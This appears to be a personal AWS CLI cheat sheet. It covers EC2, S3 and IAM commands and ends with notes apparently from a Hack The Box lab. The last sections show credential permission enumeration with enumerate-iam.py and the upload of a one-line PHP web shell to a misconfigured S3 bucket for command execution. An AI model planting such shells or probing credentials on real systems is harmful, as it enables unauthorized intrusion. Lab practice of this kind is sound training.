- [Profile Configuration](#pc)
- [EC2](#ec2)
- [S3](#s3)
- [iam](#iam)
- [aws bucket list](#awsbl)
- [aws reverse shell](#awsrs)

# Profile configuration <a name="pc"></a>
```bash
aws configure --profile <profile_name>
```
It will be necessary to introduce the **AWS ACCESS KEY ID** and the **AWS SECRET ACCESS KEY** of your account. Also, you need to specify the region name and the output format.

## Actual profile information
```bash
aws sts get-caller-identity --profile <profile_name>
```
# EC2 <a name="ec2"></a>

## General commands
- Create key pair:
```bash
aws ec2 create-key-pair --key-name <key_pair_name> --query 'KeyMaterial' --output text > <key_pair_name>
```
- Create and run instance: 
```bash
aws ec2 run-instances --image-id <image-id> --count 1 --instance-type t2.micro --key-name <key_name>
```
- List created instances:
```bash
aws ec2 describe-instances
```
- Terminate instance:
```bash
aws ec2 terminate-instances --instance-ids <instance_id>
```
- Delete key pair:
```bash
aws ec2 delete-key-pair --key-name <key_pair_name>
```

# S3 <a name="s3"></a>

## General commands
- Create a bucket:
```bash
aws s3 mb s3://<bucket_name>
```
The bucket name needs to be unique.

- List buckets:
```bash
aws s3 ls
```
- List an specific bucket:
```bash
aws s3 ls s3://<bucket_name>
```
- Copy a local file to the bucket:
```bash
aws s3 cp <file_name> s3://<bucket_name>
```
- Copy a bucket file to the actual localhost directory:

```bash
aws s3 cp s 3://<bucket_name>/<file_name> ./
```
- Delete file from a bucket
```bash
aws s3 rm s3://<bucket_name>/<file_name>
```
- Sync bucket data with a local directory:
```bash
aws s3 sync s3://<bucket_name> <local_directory>
```
- Eliminate all the contents of the bucket:
```bash
aws s3 rm s3://<bucket_name> --recursive
```
- Eliminate bucket:
```bash
aws s3 rb s3://<bucket_name> --recursive
```

# IAM <a name="iam"></a>

## General commands
- Create an IAM group:
```bash
aws iam create-group --group-name <group_name>
```
- Create IAM user:
```bash
aws iam create-user --user-name <username>
```
- Add user to a group:
```bash
aws iam add-user-to-group --user-name <username> --group-name <group_name>
```
- List group users:
```bash
aws iam get-group --group-name <group_name>
```
- Assign permissions to a user using policies:
```bash
aws iam attach-user-policy --user-name <username> --policy-arn arn:aws:iam::aws:policy/Amazons3FullAccess
```
- Create access key for a user:
```bash
aws iam create-access-key --user-name <username>
```
- List all users:
```bash
aws iam list-users
```

## Permissions enumeration - enumerate-iam.py
This script will enumerate all the services that can be used for this user. This script can be easily detected as it does a lot of querys in few time.
```bash
python3 enumerate-iam.py --access-key <access_key> --secret-key <secret_key>
```
# aws bucket list <a name="awsbl"></a>

The `aws bucket list` command is used to list the contents of the buckets found within a subdomain hosted on AWS. It is useful for finding files such as `index.php`, etc.

- `endpoint`: URL where S3 is located (replace with `s3` or another subdomain if found).
- `s3`: Interacts with the S3 service (replace with the discovered subdomain from gobuster subdomain search).
- `ls`: Lists the directory.
- `s3://{bucket name}`: Name of the bucket to interact with.

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

# aws reverse shell <a name="awsrs"></a>

The `aws reverse shell` command is used to copy files from your local machine to one of the AWS buckets. After copying the file, you can access it and enter commands.

- `endpoint`: URL where S3 is located (replace with `s3` or another subdomain if found).
- `s3`: Interacts with the S3 service (replace with the discovered subdomain from gobuster subdomain search).
- `cp`: Copies the specified file, in this case, `shell.php`, to the bucket.
- `shell.php`: The file to be copied, containing `<?php system($_GET["cmd"]); ?>` code.
- `s3://{bucket name}`: Name of the bucket to interact with.

````bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
````